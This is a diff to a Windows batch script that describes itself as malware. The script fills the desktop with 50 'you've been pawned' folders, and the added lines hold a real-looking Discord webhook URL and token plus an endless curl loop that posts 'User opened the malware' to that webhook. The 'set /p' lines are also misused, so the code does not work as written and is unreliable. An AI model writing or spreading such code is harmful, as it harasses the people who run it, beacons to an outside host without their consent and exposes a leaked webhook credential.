@@ -24,4 +24,11 @@ for /L %%i in (1,1,50) do (
     mkdir "%desktopPath%\you've been pawned %%i"
 )
 
+set /p webhook=https://discord.com/api/webhooks/1360860835441807486/2_prHEHkWQxdxjdF34ARMIywHXA51XDOH7UI44Uew829YxovXnhNDaY6tAR6TVvmS-cR : 
+:send
+cls
+set /p message=User opened the malware : 
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
+goto :send
+
 exit
